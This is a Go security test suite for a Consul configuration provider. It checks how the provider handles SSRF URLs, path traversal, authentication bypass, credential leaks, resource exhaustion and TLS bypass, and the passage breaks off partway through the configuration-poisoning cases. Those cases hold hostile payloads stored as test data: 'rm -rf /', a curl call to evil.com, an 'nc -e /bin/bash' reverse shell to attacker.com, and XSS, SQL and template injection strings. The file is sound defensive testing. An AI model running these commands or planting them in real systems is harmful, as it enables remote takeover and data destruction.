// security_test.go: Comprehensive Security Testing Suite for Argus Consul Provider
//
// RED TEAM SECURITY ANALYSIS:
// This file implements systematic security testing against Consul remote configuration provider,
// designed to identify and prevent common attack vectors in production environments.
//
// THREAT MODEL:
// - Malicious Consul URLs (SSRF, injection attacks, credential exposure)
// - Authentication bypass and privilege escalation attacks
// - Resource exhaustion and DoS through connection abuse
// - Man-in-the-middle attacks via TLS bypass
// - Configuration injection and data poisoning
// - Sensitive data leakage through error messages and logs
// - Race conditions in concurrent access scenarios
// - Provider state manipulation and resource leaks
//
// PHILOSOPHY:
// Each test is designed to be:
// - DRY (Don't Repeat Yourself) with reusable security utilities
// - SMART (Specific, Measurable, Achievable, Relevant, Time-bound)
// - COMPREHENSIVE covering all major attack vectors
// - WELL-DOCUMENTED explaining the security implications
//
// METHODOLOGY:
// 1. Identify attack surface and entry points in Consul provider
// 2. Create targeted exploit scenarios for each vulnerability class
// 3. Test boundary conditions and edge cases specific to Consul
// 4. Validate security controls and mitigations in provider
// 5. Document vulnerabilities and remediation steps
//
// Copyright (c) 2025 AGILira - A. Giordano
// Series: an AGLIra library
// SPDX-License-Identifier: MPL-2.0

package consul

import (
	"context"
	"crypto/tls"
	"fmt"
	"net/http"
	"net/http/httptest"
	"net/url"
	"runtime"
	"strings"
	"sync"
	"sync/atomic"
	"testing"
	"time"
)

// =============================================================================
// SECURITY TESTING UTILITIES AND HELPERS
// =============================================================================

// SecurityTestContext provides utilities for security testing scenarios specific to Consul provider.
// This centralizes common security testing patterns and reduces code duplication.
type SecurityTestContext struct {
	t                    *testing.T
	tempDir              string
	originalEnvVars      map[string]string
	mockConsulServers    []*httptest.Server
	cleanupFunctions     []func()
	mu                   sync.Mutex
	memoryUsageBefore    uint64
	goroutineCountBefore int
}

// NewSecurityTestContext creates a new security testing context with automatic cleanup.
//
// SECURITY BENEFIT: Ensures test isolation and prevents test artifacts from
// affecting system security or other tests. Critical for reliable security testing.
func NewSecurityTestContext(t *testing.T) *SecurityTestContext {
	ctx := &SecurityTestContext{
		t:                    t,
		tempDir:              t.TempDir(),
		originalEnvVars:      make(map[string]string),
		mockConsulServers:    make([]*httptest.Server, 0),
		cleanupFunctions:     make([]func(), 0),
		goroutineCountBefore: runtime.NumGoroutine(),
	}

	// Capture initial memory usage for resource leak detection
	var memStats runtime.MemStats
	runtime.GC()
	runtime.ReadMemStats(&memStats)
	ctx.memoryUsageBefore = memStats.Alloc

	// Register cleanup
	t.Cleanup(ctx.Cleanup)

	return ctx
}

// CreateMaliciousConsulServer creates a mock Consul server with malicious responses.
//
// SECURITY PURPOSE: Tests how the provider handles various malicious server behaviors,
// including oversized responses, connection hijacking, and protocol attacks.
func (ctx *SecurityTestContext) CreateMaliciousConsulServer(behavior string) *httptest.Server {
	ctx.mu.Lock()
	defer ctx.mu.Unlock()

	server := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		switch behavior {
		case "oversized_response":
			// Send extremely large response to test memory exhaustion
			w.Header().Set("Content-Type", "application/json")
			w.WriteHeader(http.StatusOK)
			largeData := strings.Repeat(`{"key": "value", `, 1024*1024) // 1MB+ of JSON
			_, _ = fmt.Fprintf(w, `[{"Key": "test", "Value": "%s"}]`, largeData)

		case "slow_response":
			// Simulate slowloris attack - send headers then delay
			w.Header().Set("Content-Type", "application/json")
			w.WriteHeader(http.StatusOK)
			time.Sleep(30 * time.Second) // Force timeout
			_, _ = fmt.Fprint(w, `[{"Key": "test", "Value": "dGVzdA=="}]`)

		case "malformed_json":
			// Send malformed JSON to test parser resilience
			w.Header().Set("Content-Type", "application/json")
			w.WriteHeader(http.StatusOK)
			_, _ = fmt.Fprint(w, `[{"Key": "test", "Value": "invalid_base64_{{{{"}]`)

		case "redirect_loop":
			// Create infinite redirect loop
			w.Header().Set("Location", r.URL.String())
			w.WriteHeader(http.StatusMovedPermanently)

		case "ssrf_attempt":
			// Try to make provider connect to internal services
			w.Header().Set("Location", "http://127.0.0.1:22/") // SSH port
			w.WriteHeader(http.StatusMovedPermanently)

		case "credential_leak":
			// Echo back credentials to test for leakage
			auth := r.Header.Get("Authorization")
			token := r.Header.Get("X-Consul-Token")
			_, _ = fmt.Fprintf(w, `{"auth":"%s","token":"%s"}`, auth, token)

		case "connection_hijack":
			// Attempt to hijack the connection
			hijacker, ok := w.(http.Hijacker)
			if ok {
				conn, _, err := hijacker.Hijack()
				if err == nil {
					_, _ = conn.Write([]byte("HTTP/1.1 200 OK\r\nContent-Type: text/plain\r\n\r\nHIJACKED"))
					_ = conn.Close()
				}
			}

		default:
			// Normal behavior for baseline tests
			w.Header().Set("Content-Type", "application/json")
			w.WriteHeader(http.StatusOK)
			_, _ = fmt.Fprint(w, `[{"Key": "test", "Value": "dGVzdA=="}]`)
		}
	}))

	ctx.mockConsulServers = append(ctx.mockConsulServers, server)
	return server
}

// CreateTLSConsulServer creates a mock Consul server with various TLS configurations for testing.
//
// SECURITY PURPOSE: Tests TLS validation, certificate verification bypass attempts,
// and man-in-the-middle attack scenarios.
func (ctx *SecurityTestContext) CreateTLSConsulServer(tlsConfig string) *httptest.Server {
	ctx.mu.Lock()
	defer ctx.mu.Unlock()

	var server *httptest.Server

	switch tlsConfig {
	case "self_signed":
		// Self-signed certificate (should be rejected by default)
		server = httptest.NewTLSServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
			w.Header().Set("Content-Type", "application/json")
			_, _ = fmt.Fprint(w, `[{"Key": "test", "Value": "dGVzdA=="}]`)
		}))

	case "invalid_hostname":
		// Certificate with wrong hostname
		server = httptest.NewUnstartedServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
			w.Header().Set("Content-Type", "application/json")
			_, _ = fmt.Fprint(w, `[{"Key": "test", "Value": "dGVzdA=="}]`)
		}))
		// Use TLS config with wrong certificate
		server.TLS = &tls.Config{
			ServerName: "wrong.example.com",
		}
		server.StartTLS()

	case "weak_cipher":
		// Server with weak cipher suites
		server = httptest.NewUnstartedServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
			w.Header().Set("Content-Type", "application/json")
			_, _ = fmt.Fprint(w, `[{"Key": "test", "Value": "dGVzdA=="}]`)
		}))
		server.TLS = &tls.Config{
			CipherSuites: []uint16{tls.TLS_RSA_WITH_RC4_128_SHA}, // Weak cipher
		}
		server.StartTLS()

	default:
		// Valid TLS server
		server = httptest.NewTLSServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
			w.Header().Set("Content-Type", "application/json")
			_, _ = fmt.Fprint(w, `[{"Key": "test", "Value": "dGVzdA=="}]`)
		}))
	}

	ctx.mockConsulServers = append(ctx.mockConsulServers, server)
	return server
}

// ExpectSecurityError validates that a security-related error occurred.
//
// SECURITY PRINCIPLE: Security tests should expect failures when malicious
// input is provided. If an operation succeeds with malicious input, that
// indicates a potential security vulnerability.
func (ctx *SecurityTestContext) ExpectSecurityError(err error, operation string) {
	if err == nil {
		ctx.t.Errorf("SECURITY VULNERABILITY: %s should have failed with malicious input but succeeded", operation)
	}
}

// ExpectSecuritySuccess validates that a legitimate operation succeeded.
//
// SECURITY PRINCIPLE: Security controls should not break legitimate functionality.
func (ctx *SecurityTestContext) ExpectSecuritySuccess(err error, operation string) {
	if err != nil {
		ctx.t.Errorf("SECURITY ISSUE: %s should have succeeded with legitimate input but failed: %v", operation, err)
	}
}

// CheckResourceLeak detects memory and goroutine leaks after operations.
//
// SECURITY PURPOSE: Resource leaks can be exploited for DoS attacks and
// indicate improper cleanup that could lead to security issues.
func (ctx *SecurityTestContext) CheckResourceLeak(operationName string) {
	runtime.GC()
	time.Sleep(100 * time.Millisecond) // Allow cleanup to complete

	var memStats runtime.MemStats
	runtime.ReadMemStats(&memStats)
	currentMemory := memStats.Alloc
	currentGoroutines := runtime.NumGoroutine()

	// Check for significant memory increase (handle potential underflow)
	var memoryIncrease uint64
	if currentMemory > ctx.memoryUsageBefore {
		memoryIncrease = currentMemory - ctx.memoryUsageBefore
		if memoryIncrease > 10*1024*1024 { // More than 10MB increase
			ctx.t.Errorf("SECURITY WARNING: %s caused significant memory increase: %d bytes",
				operationName, memoryIncrease)
		}
	}

	// Check for goroutine leaks (be more tolerant for stress tests)
	goroutineIncrease := currentGoroutines - ctx.goroutineCountBefore
	toleranceLimit := 5
	if strings.Contains(operationName, "exhaustion") || strings.Contains(operationName, "concurrent") {
		toleranceLimit = 200 // Higher tolerance for stress tests that create many goroutines
	}

	if goroutineIncrease > toleranceLimit {
		ctx.t.Errorf("SECURITY WARNING: %s caused goroutine leak: %d new goroutines",
			operationName, goroutineIncrease)
	}
}

// Cleanup restores environment and shuts down test servers.
func (ctx *SecurityTestContext) Cleanup() {
	ctx.mu.Lock()
	defer ctx.mu.Unlock()

	// Run custom cleanup functions
	for _, fn := range ctx.cleanupFunctions {
		func() {
			defer func() {
				if r := recover(); r != nil {
					ctx.t.Logf("Warning: Cleanup function panicked: %v", r)
				}
			}()
			fn()
		}()
	}

	// Close mock servers
	for _, server := range ctx.mockConsulServers {
		server.Close()
	}
}

// =============================================================================
// CONSUL URL INJECTION AND VALIDATION ATTACKS
// =============================================================================

// TestSecurity_ConsulURLInjectionAttacks tests for URL injection vulnerabilities.
//
// ATTACK VECTOR: URL injection and SSRF (CWE-918)
// DESCRIPTION: Attackers attempt to manipulate Consul URLs to access internal
// services, bypass authentication, or perform server-side request forgery.
//
// IMPACT: Could lead to unauthorized access to internal services, credential
// exposure, or information disclosure about internal network topology.
func TestSecurity_ConsulURLInjectionAttacks(t *testing.T) {
	ctx := NewSecurityTestContext(t)

	maliciousURLs := []struct {
		name        string
		url         string
		description string
		expectError bool
	}{
		{
			name:        "SSRFInternalServices",
			url:         "consul://127.0.0.1:22/config", // SSH port
			description: "Attempt to connect to internal SSH service via SSRF",
			expectError: false, // URL parsing should succeed, connection should fail safely
		},
		{
			name:        "SSRFMetadataService",
			url:         "consul://169.254.169.254:80/latest/meta-data/", // AWS metadata
			description: "Attempt to access cloud metadata service",
			expectError: false, // URL parsing should succeed
		},
		{
			name:        "SSRFLocalhostBypass",
			url:         "consul://localhost:3306/config", // MySQL port
			description: "Attempt to access local database via localhost",
			expectError: false,
		},
		{
			name:        "CredentialInjectionInURL",
			url:         "consul://admin:secret123@consul.evil.com:8500/config",
			description: "Embedded credentials that could be logged or leaked",
			expectError: false, // Should parse but credentials should be handled securely
		},
		{
			name:        "FragmentInjection",
			url:         "consul://consul.example.com:8500/config#../../../etc/passwd",
			description: "Fragment injection attempt for path traversal",
			expectError: false, // Fragments should be ignored in HTTP requests
		},
		{
			name:        "SchemeConfusion",
			url:         "http://consul.example.com:8500/config", // Wrong scheme
			description: "Wrong scheme should be rejected by provider",
			expectError: true,
		},
		{
			name:        "QueryParameterInjection",
			url:         "consul://consul.example.com:8500/config?token=secret&debug=true&admin=1",
			description: "Query parameter injection with sensitive data",
			expectError: false, // Should parse but handle parameters securely
		},
		{
			name:        "PortScanningAttempt",
			url:         "consul://internal.company.com:65535/config",
			description: "High port number for internal port scanning",
			expectError: false,
		},
		{
			name:        "IPv6LocalhostBypass",
			url:         "consul://[::1]:8500/config",
			description: "IPv6 localhost bypass attempt",
			expectError: false,
		},
		{
			name:        "OverlongHostname",
			url:         "consul://" + strings.Repeat("a", 1000) + ".com:8500/config",
			description: "Overlong hostname to test buffer handling",
			expectError: false, // Should parse but may fail connection validation
		},
	}

	for _, attack := range maliciousURLs {
		t.Run(attack.name, func(t *testing.T) {
			provider := &ConsulProvider{}

			// SECURITY TEST: URL validation
			err := provider.Validate(attack.url)

			if attack.expectError {
				ctx.ExpectSecurityError(err, fmt.Sprintf("validating malicious URL: %s", attack.description))
			} else {
				// URL should parse successfully
				if err != nil {
					t.Logf("URL parsing failed (may be expected): %v", err)
				}

				// SECURITY TEST: Ensure no actual connection is made during validation
				// Validation should be purely syntactic
				startTime := time.Now()
				_ = provider.Validate(attack.url)
				duration := time.Since(startTime)

				if duration > 100*time.Millisecond {
					t.Errorf("SECURITY WARNING: URL validation took too long (%v), may be making network requests", duration)
				}

				// SECURITY TEST: Attempt to load config and ensure it fails safely for malicious URLs
				ctxTimeout, cancel := context.WithTimeout(context.Background(), 2*time.Second)
				defer cancel()

				_, loadErr := provider.Load(ctxTimeout, attack.url)
				if loadErr == nil {
					t.Errorf("SECURITY CONCERN: Load succeeded for potentially malicious URL: %s", attack.url)
				}
			}
		})
	}
}

// TestSecurity_ConsulPathTraversalInKeys tests for path traversal in Consul key paths.
//
// ATTACK VECTOR: Path traversal through Consul key names (CWE-22)
// DESCRIPTION: Attackers attempt to use path traversal sequences in Consul key
// names to access unauthorized configuration data.
func TestSecurity_ConsulPathTraversalInKeys(t *testing.T) {
	_ = NewSecurityTestContext(t) // Initialize context for cleanup

	maliciousKeyPaths := []struct {
		name        string
		consulURL   string
		description string
	}{
		{
			name:        "BasicPathTraversal",
			consulURL:   "consul://localhost:8500/../../../secret/config",
			description: "Basic path traversal in Consul key path",
		},
		{
			name:        "WindowsPathTraversal",
			consulURL:   "consul://localhost:8500/..\\..\\secret\\config",
			description: "Windows-style path traversal in key path",
		},
		{
			name:        "URLEncodedTraversal",
			consulURL:   "consul://localhost:8500/%2e%2e%2fsecret%2fconfig",
			description: "URL-encoded path traversal in key path",
		},
		{
			name:        "DoubleEncodedTraversal",
			consulURL:   "consul://localhost:8500/%252e%252e%252fsecret%252fconfig",
			description: "Double URL-encoded path traversal",
		},
		{
			name:        "NullByteInjection",
			consulURL:   "consul://localhost:8500/config\x00../secret",
			description: "Null byte injection in key path",
		},
		{
			name:        "LongTraversalChain",
			consulURL:   "consul://localhost:8500/" + strings.Repeat("../", 50) + "secret/config",
			description: "Excessively long traversal chain",
		},
	}

	for _, attack := range maliciousKeyPaths {
		t.Run(attack.name, func(t *testing.T) {
			provider := &ConsulProvider{}

			// SECURITY TEST: Path validation during URL parsing
			err := provider.Validate(attack.consulURL)

			// The provider should either reject malicious paths or sanitize them safely
			if err == nil {
				// If validation passes, ensure the actual key path is safe
				config, kvPath, _, _, parseErr := provider.parseConsulURL(attack.consulURL)
				if parseErr == nil {
					// Check if the parsed path contains dangerous sequences
					if strings.Contains(kvPath, "..") {
						t.Errorf("SECURITY VULNERABILITY: Path traversal not sanitized in key path: %s -> %s",
							attack.consulURL, kvPath)
					}

					// Check for other dangerous patterns
					dangerousPatterns := []string{"../", "..\\", "%2e%2e", "\x00"}
					for _, pattern := range dangerousPatterns {
						if strings.Contains(kvPath, pattern) {
							t.Errorf("SECURITY VULNERABILITY: Dangerous pattern '%s' found in parsed key path: %s",
								pattern, kvPath)
						}
					}

					t.Logf("Key path safely parsed: %s -> %s (config: %+v)", attack.consulURL, kvPath, config.Address)
				}
			}
		})
	}
}

// =============================================================================
// AUTHENTICATION AND AUTHORIZATION ATTACKS
// =============================================================================

// TestSecurity_AuthenticationBypassAttacks tests for authentication bypass vulnerabilities.
//
// ATTACK VECTOR: Authentication bypass (CWE-287)
// DESCRIPTION: Attackers attempt to bypass ACL token authentication through
// various techniques including token injection, header manipulation, and timing attacks.
func TestSecurity_AuthenticationBypassAttacks(t *testing.T) {
	ctx := NewSecurityTestContext(t)

	// Create mock server that requires authentication
	authServer := ctx.CreateMaliciousConsulServer("credential_leak")
	defer authServer.Close()

	serverURL, _ := url.Parse(authServer.URL)
	consulHost := serverURL.Host

	authBypassAttempts := []struct {
		name        string
		consulURL   string
		description string
	}{
		{
			name:        "EmptyTokenBypass",
			consulURL:   fmt.Sprintf("consul://%s/config?token=", consulHost),
			description: "Attempt bypass with empty token parameter",
		},
		{
			name:        "SQLInjectionInToken",
			consulURL:   fmt.Sprintf("consul://%s/config?token=' OR '1'='1", consulHost),
			description: "SQL injection attempt in ACL token",
		},
		{
			name:        "TokenHeaderInjection",
			consulURL:   fmt.Sprintf("consul://%s/config?token=valid%%0d%%0aX-Admin: true", consulHost),
			description: "HTTP header injection via token parameter",
		},
		{
			name:        "TokenWithNullBytes",
			consulURL:   fmt.Sprintf("consul://%s/config?token=secret\x00admin", consulHost),
			description: "Null byte injection in token",
		},
		{
			name:        "OverlongToken",
			consulURL:   fmt.Sprintf("consul://%s/config?token=%s", consulHost, strings.Repeat("a", 10000)),
			description: "Overlong token to test buffer handling",
		},
		{
			name:        "TokenWithControlChars",
			consulURL:   fmt.Sprintf("consul://%s/config?token=secret%%01%%02%%03", consulHost),
			description: "Control characters in token",
		},
		{
			name:        "MultipleTokensInjection",
			consulURL:   fmt.Sprintf("consul://%s/config?token=fake&token=real", consulHost),
			description: "Multiple token parameters injection",
		},
	}

	for _, attack := range authBypassAttempts {
		t.Run(attack.name, func(t *testing.T) {
			provider := &ConsulProvider{}

			// SECURITY TEST: Validation should not expose authentication issues
			err := provider.Validate(attack.consulURL)
			if err != nil {
				t.Logf("URL validation failed (expected for malformed URLs): %v", err)
				return
			}

			// SECURITY TEST: Load operation with malicious authentication
			ctxTimeout, cancel := context.WithTimeout(context.Background(), 3*time.Second)
			defer cancel()

			startTime := time.Now()
			_, err = provider.Load(ctxTimeout, attack.consulURL)
			duration := time.Since(startTime)

			// Should fail for authentication reasons, not bypass
			ctx.ExpectSecurityError(err, fmt.Sprintf("authentication bypass attempt: %s", attack.description))

			// SECURITY ANALYSIS: Check for timing attack vulnerabilities
			if duration < 10*time.Millisecond {
				t.Logf("Fast failure (good): %v - may indicate proper input validation", duration)
			} else if duration > 5*time.Second {
				t.Errorf("SECURITY WARNING: Slow authentication failure (%v) may indicate timing attack vulnerability", duration)
			}
		})
	}
}

// TestSecurity_CredentialLeakageAttacks tests for credential exposure vulnerabilities.
//
// ATTACK VECTOR: Information disclosure (CWE-200)
// DESCRIPTION: Attackers attempt to extract credentials through error messages,
// logs, or other information leakage channels.
func TestSecurity_CredentialLeakageAttacks(t *testing.T) {
	ctx := NewSecurityTestContext(t)

	// Create server that echoes back credentials
	leakServer := ctx.CreateMaliciousConsulServer("credential_leak")
	defer leakServer.Close()

	serverURL, _ := url.Parse(leakServer.URL)
	consulHost := serverURL.Host

	credentialTests := []struct {
		name        string
		consulURL   string
		description string
	}{
		{
			name:        "PasswordInURL",
			consulURL:   fmt.Sprintf("consul://user:topsecret123@%s/config", consulHost),
			description: "Password embedded in URL",
		},
		{
			name:        "TokenInURL",
			consulURL:   fmt.Sprintf("consul://%s/config?token=secret-acl-token-123", consulHost),
			description: "ACL token in URL parameters",
		},
		{
			name:        "MultipleCredentials",
			consulURL:   fmt.Sprintf("consul://admin:password@%s/config?token=token123&datacenter=secret", consulHost),
			description: "Multiple credential types",
		},
	}

	for _, test := range credentialTests {
		t.Run(test.name, func(t *testing.T) {
			provider := &ConsulProvider{}

			// SECURITY TEST: Ensure validation doesn't leak credentials
			err := provider.Validate(test.consulURL)
			if err != nil {
				// Check if error message contains credentials
				errorMsg := err.Error()
				if strings.Contains(errorMsg, "topsecret123") ||
					strings.Contains(errorMsg, "secret-acl-token-123") ||
					strings.Contains(errorMsg, "password") {
					t.Errorf("SECURITY VULNERABILITY: Credential leaked in validation error: %s", errorMsg)
				}
			}

			// SECURITY TEST: Ensure Load operations don't leak credentials in errors
			ctxTimeout, cancel := context.WithTimeout(context.Background(), 2*time.Second)
			defer cancel()

			_, err = provider.Load(ctxTimeout, test.consulURL)
			if err != nil {
				errorMsg := err.Error()
				// Check for credential leakage in error messages
				sensitiveData := []string{
					"topsecret123", "secret-acl-token-123", "password",
					"admin", "token123", "secret",
				}

				for _, sensitive := range sensitiveData {
					if strings.Contains(errorMsg, sensitive) {
						t.Errorf("SECURITY VULNERABILITY: Sensitive data '%s' leaked in Load error: %s",
							sensitive, errorMsg)
					}
				}
			}

			// SECURITY TEST: String representation should not expose credentials
			providerStr := fmt.Sprintf("%+v", provider)
			if strings.Contains(providerStr, "topsecret123") ||
				strings.Contains(providerStr, "secret-acl-token-123") {
				t.Errorf("SECURITY VULNERABILITY: Credentials exposed in provider string representation")
			}
		})
	}
}

// =============================================================================
// RESOURCE EXHAUSTION AND DENIAL OF SERVICE ATTACKS
// =============================================================================

// TestSecurity_ResourceExhaustionAttacks tests for DoS via resource exhaustion.
//
// ATTACK VECTOR: Resource exhaustion (CWE-400)
// DESCRIPTION: Attackers attempt to consume excessive resources through
// large responses, connection exhaustion, or memory exhaustion attacks.
func TestSecurity_ResourceExhaustionAttacks(t *testing.T) {
	ctx := NewSecurityTestContext(t)

	t.Run("LargeResponseAttack", func(t *testing.T) {
		// Create server that sends oversized responses
		maliciousServer := ctx.CreateMaliciousConsulServer("oversized_response")
		defer maliciousServer.Close()

		serverURL, _ := url.Parse(maliciousServer.URL)
		consulURL := fmt.Sprintf("consul://%s/config", serverURL.Host)

		provider := &ConsulProvider{}
		provider.SetMockData(map[string]string{
			"config": `{"test": "value"}`, // Small normal config for comparison
		})

		// SECURITY TEST: Load operation should handle large responses safely
		ctxTimeout, cancel := context.WithTimeout(context.Background(), 5*time.Second)
		defer cancel()

		startMemory := getCurrentMemoryUsage()
		_, err := provider.Load(ctxTimeout, consulURL)
		endMemory := getCurrentMemoryUsage()

		// Should either fail gracefully or handle the large response within reasonable memory limits
		if endMemory > startMemory {
			memoryIncrease := endMemory - startMemory
			if memoryIncrease > 100*1024*1024 { // More than 100MB
				t.Errorf("SECURITY VULNERABILITY: Large response attack caused excessive memory usage: %d bytes",
					memoryIncrease)
			}
		}

		if err == nil {
			t.Logf("Large response was handled (check memory usage)")
		} else {
			t.Logf("Large response was rejected (good): %v", err)
		}

		ctx.CheckResourceLeak("large response attack")
	})

	t.Run("SlowlorisAttack", func(t *testing.T) {
		// Create server with slow responses (slowloris-style attack)
		slowServer := ctx.CreateMaliciousConsulServer("slow_response")
		defer slowServer.Close()

		serverURL, _ := url.Parse(slowServer.URL)
		consulURL := fmt.Sprintf("consul://%s/config", serverURL.Host)

		provider := &ConsulProvider{}

		// SECURITY TEST: Should timeout and not hang indefinitely
		ctxTimeout, cancel := context.WithTimeout(context.Background(), 3*time.Second)
		defer cancel()

		startTime := time.Now()
		_, err := provider.Load(ctxTimeout, consulURL)
		duration := time.Since(startTime)

		// Should timeout within reasonable time
		ctx.ExpectSecurityError(err, "slow response attack (should timeout)")

		if duration > 10*time.Second {
			t.Errorf("SECURITY VULNERABILITY: Slow response attack caused excessive wait time: %v", duration)
		}

		ctx.CheckResourceLeak("slowloris attack")
	})

	t.Run("ConnectionExhaustionAttack", func(t *testing.T) {
		// Test concurrent connection handling
		normalServer := ctx.CreateMaliciousConsulServer("normal")
		defer normalServer.Close()

		serverURL, _ := url.Parse(normalServer.URL)
		consulURL := fmt.Sprintf("consul://%s/config", serverURL.Host)

		// SECURITY TEST: Create many concurrent connections
		var wg sync.WaitGroup
		concurrentRequests := 50
		errors := make([]error, concurrentRequests)

		for i := 0; i < concurrentRequests; i++ {
			wg.Add(1)
			go func(index int) {
				defer wg.Done()

				provider := &ConsulProvider{}
				ctx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
				defer cancel()

				_, err := provider.Load(ctx, consulURL)
				errors[index] = err

				// Clean up
				_ = provider.Close()
			}(i)
		}

		wg.Wait()

		// SECURITY ANALYSIS: Check if any connections succeeded (some should)
		successCount := 0
		for _, err := range errors {
			if err == nil {
				successCount++
			}
		}

		if successCount == 0 {
			t.Logf("All concurrent requests failed - may indicate proper rate limiting")
		} else {
			t.Logf("Concurrent requests handled: %d/%d succeeded", successCount, concurrentRequests)
		}

		ctx.CheckResourceLeak("connection exhaustion attack")
	})

	t.Run("WatchResourceExhaustionAttack", func(t *testing.T) {
		// Test watch operation resource usage
		provider := &ConsulProvider{}
		provider.SetMockData(map[string]string{
			"config": `{"test": "value"}`,
		})

		// SECURITY TEST: Create many concurrent watch operations
		var channels []<-chan map[string]interface{}
		var cancels []context.CancelFunc

		for i := 0; i < 20; i++ {
			ctx, cancel := context.WithTimeout(context.Background(), 2*time.Second)
			cancels = append(cancels, cancel)

			ch, err := provider.Watch(ctx, "consul://localhost:8500/config")
			if err != nil {
				t.Logf("Watch %d failed: %v", i, err)
				cancel()
				continue
			}
			channels = append(channels, ch)
		}

		// Let watches run briefly
		time.Sleep(500 * time.Millisecond)

		// Cancel all watches
		for _, cancel := range cancels {
			cancel()
		}

		// Consume any remaining messages to prevent goroutine leaks
		time.Sleep(200 * time.Millisecond)
		for _, ch := range channels {
			select {
			case <-ch:
				// Consume message
			default:
				// No message available
			}
		}

		_ = provider.Close()
		ctx.CheckResourceLeak("watch resource exhaustion attack")
	})
}

// =============================================================================
// TLS AND ENCRYPTION ATTACKS
// =============================================================================

// TestSecurity_TLSBypassAttacks tests for TLS validation bypass vulnerabilities.
//
// ATTACK VECTOR: TLS validation bypass (CWE-295)
// DESCRIPTION: Attackers attempt to bypass TLS certificate validation to
// perform man-in-the-middle attacks or connect to malicious servers.
func TestSecurity_TLSBypassAttacks(t *testing.T) {
	ctx := NewSecurityTestContext(t)

	t.Run("SelfSignedCertificateAttack", func(t *testing.T) {
		// Create server with self-signed certificate
		tlsServer := ctx.CreateTLSConsulServer("self_signed")
		defer tlsServer.Close()

		// Extract host from HTTPS URL and create consul URL
		serverURL, _ := url.Parse(tlsServer.URL)
		consulURL := fmt.Sprintf("consul://%s/config?tls=true", serverURL.Host)

		provider := &ConsulProvider{}

		// SECURITY TEST: Should reject self-signed certificates by default
		ctxTimeout, cancel := context.WithTimeout(context.Background(), 3*time.Second)
		defer cancel()

		_, err := provider.Load(ctxTimeout, consulURL)

		// Should fail due to certificate validation
		ctx.ExpectSecurityError(err, "self-signed certificate should be rejected")

		if err != nil && strings.Contains(err.Error(), "certificate") {
			t.Logf("SECURITY GOOD: Self-signed certificate properly rejected: %v", err)
		} else if err == nil {
			t.Errorf("SECURITY VULNERABILITY: Self-signed certificate was accepted")
		}
	})

	t.Run("InvalidHostnameAttack", func(t *testing.T) {
		// Create server with certificate for wrong hostname
		tlsServer := ctx.CreateTLSConsulServer("invalid_hostname")
		defer tlsServer.Close()

		serverURL, _ := url.Parse(tlsServer.URL)
		consulURL := fmt.Sprintf("consul://%s/config?tls=true", serverURL.Host)

		provider := &ConsulProvider{}

		ctxTimeout, cancel := context.WithTimeout(context.Background(), 3*time.Second)
		defer cancel()

		_, err := provider.Load(ctxTimeout, consulURL)

		// Should fail due to hostname validation
		ctx.ExpectSecurityError(err, "certificate hostname mismatch should be rejected")
	})

	t.Run("WeakCipherAttack", func(t *testing.T) {
		// Create server with weak cipher suites
		tlsServer := ctx.CreateTLSConsulServer("weak_cipher")
		defer tlsServer.Close()

		serverURL, _ := url.Parse(tlsServer.URL)
		consulURL := fmt.Sprintf("consul://%s/config?tls=true", serverURL.Host)

		provider := &ConsulProvider{}

		ctxTimeout, cancel := context.WithTimeout(context.Background(), 3*time.Second)
		defer cancel()

		_, err := provider.Load(ctxTimeout, consulURL)

		// Should either reject weak ciphers or handle them securely
		if err != nil {
			t.Logf("Weak cipher connection failed (potentially good): %v", err)
		} else {
			t.Logf("SECURITY WARNING: Weak cipher connection succeeded - verify cipher strength")
		}
	})

	t.Run("TLSDowngradeAttack", func(t *testing.T) {
		// Test if provider can be forced to use non-TLS when TLS is specified
		normalServer := ctx.CreateMaliciousConsulServer("normal")
		defer normalServer.Close()

		// Get HTTP URL but try to force TLS
		serverURL, _ := url.Parse(normalServer.URL)
		consulURL := fmt.Sprintf("consul://%s/config?tls=true", serverURL.Host)

		provider := &ConsulProvider{}

		ctxTimeout, cancel := context.WithTimeout(context.Background(), 3*time.Second)
		defer cancel()

		_, err := provider.Load(ctxTimeout, consulURL)

		// This should fail because we're trying to use TLS on an HTTP server
		ctx.ExpectSecurityError(err, "TLS downgrade should be prevented")
	})
}

// =============================================================================
// CONFIGURATION INJECTION AND DATA POISONING ATTACKS
// =============================================================================

// TestSecurity_ConfigurationPoisoningAttacks tests for data poisoning vulnerabilities.
//
// ATTACK VECTOR: Data injection (CWE-74)
// DESCRIPTION: Attackers attempt to inject malicious configuration data
// that could compromise the application using the configuration.
func TestSecurity_ConfigurationPoisoningAttacks(t *testing.T) {
	ctx := NewSecurityTestContext(t)

	maliciousConfigs := []struct {
		name        string
		configData  string
		description string
	}{
		{
			name: "JavaScriptInjection",
			configData: `{
				"command": "<script>alert('xss')</script>",
				"url": "javascript:alert(1)"
			}`,
			description: "JavaScript injection in configuration values",
		},
		{
			name: "SQLInjectionPayload",
			configData: `{
				"query": "'; DROP TABLE users; --",
				"filter": "1' OR '1'='1"
			}`,
			description: "SQL injection payloads in configuration",
		},
		{
			name: "CommandInjectionPayload",
			configData: `{
				"command": "ls; rm -rf /",
				"path": "/bin/sh -c 'curl http://evil.com'",
				"arg": "; nc -e /bin/bash attacker.com 443"
			}`,
			description: "Command injection payloads",
		},
		{
			name: "PathTraversalPayload",
			configData: `{
				"file": "../../../etc/passwd",
				"include": "..\\..\\windows\\system32\\config\\sam",
				"template": "/proc/self/environ"
			}`,
			description: "Path traversal in configuration paths",
		},
		{
			name: "XSSPayload",
			configData: `{
				"title": "<img src=x onerror=alert(1)>",
				"description": "<svg onload=alert(document.cookie)>",
				"content": "{{constructor.constructor('alert(1)')()}}"
			}`,
			description: "Cross-site scripting payloads",
		},
		{
			name: "LDAPInjection",
			configData: `{
				"filter": "*)(&(objectClass=*",
				"base": "dc=*)(uid=*))(&(|(objectClass=*"
			}`,
			description: "LDAP injection payloads",
		},
		{
			name: "TemplateInjection",
			configData: `{
				"template": "{{7*7}}",
				"expression": "${7*7}",
				"handlebars": "{{#with this}}{{constructor.constructor 'alert(1)'}}{{/with}}"
			}`,
			description: "Template injection attacks",
		},
		{
			name: "OversizedConfig",
			configData: fmt.Sprintf(`{
				"large_field": "%s",
				"many_fields": %s
			}`,
				strings.Repeat("A", 1024*1024), // 1MB string
